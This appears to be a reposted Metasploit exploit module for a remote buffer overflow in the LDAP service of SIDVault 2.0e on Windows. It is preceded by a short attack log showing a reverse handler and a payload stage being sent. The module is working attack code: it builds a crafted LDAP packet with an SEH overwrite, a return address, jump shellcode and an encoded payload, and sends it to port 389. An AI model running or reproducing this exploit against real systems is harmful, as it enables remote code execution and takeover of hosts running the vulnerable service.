SIDVault 2.0e Windows Remote Buffer Overflow Exploit (meta)
===========================================================


#--attack-log--
#[*] Please wait while we load the module tree...
#[*] Handler binding to LHOST 0.0.0.0
#[*] Started reverse handler
#[*] Sending stage (718336 bytes)



##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require &#039;msf/core&#039;


class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			&#039;Name&#039;           => &#039;SIDVault 2.0e Windows Remote Buffer Overflow&#039;,
			&#039;Description&#039;    => %q{
				This exploits a buffer overflow in the LDAP service that is
				part of the SIDVault product. This module was tested against
				version 2.0e.
					
			},
			&#039;Author&#039; 	 => [ &#039;His0k4 <his0k4.hlm[at]gmail.com>&#039; ],
			&#039;License&#039;        => MSF_LICENSE,
			&#039;Version&#039;        => &#039;$Revision$&#039;,
			&#039;References&#039;     =>
				[
					[ &#039;URL&#039;, &#039;http://www.milw0rm.com/exploits/9586&#039;],

				],
			&#039;Privileged&#039;     => true,
			&#039;Payload&#039;        =>
				{
					&#039;Space&#039;    => 750,
					&#039;BadChars&#039; => "\x00",
					&#039;StackAdjustment&#039; => -3500,
					&#039;EncoderType&#039;   => Msf::Encoder::Type::AlphanumUpper,
					&#039;DisableNops&#039;  =>  &#039;True&#039;,
				},
			&#039;Platform&#039;       => &#039;win&#039;,
			&#039;Targets&#039;        => 
				[
					#Tested against xp_sp3 OK
					["Universal",   { &#039;Ret&#039; => "\x29\x10\x40" }], #p/p/r sidvault.exe
				],
			&#039;DefaultTarget&#039; => 0))
			
			register_options(
				[
					Opt::RPORT(389)
				], self.class)
	end

	def exploit
		connect
		
		sploit = "\x30\x82\x12\x10\x02\x01\x01\x60\x82\x12\x09\x02\x01\x03\x04\x82\x10\xfe"	
		sploit << "dc="	
		sploit << rand_text_alpha(1028)
		sploit << payload.encoded
		sploit << rand_text_alpha(3302 - payload.encoded.length)
		sploit << "\xE8\x15\xF3\xFF\xFF"
		sploit << make_nops(5)
		sploit << "\xEB\xF4\x90\x90"
		sploit << target.ret
		sploit << "\x80\x82\x01\x00"
		sploit << rand_text_alpha(500)
		
		sock.put(sploit)
		
		handler
	end

end




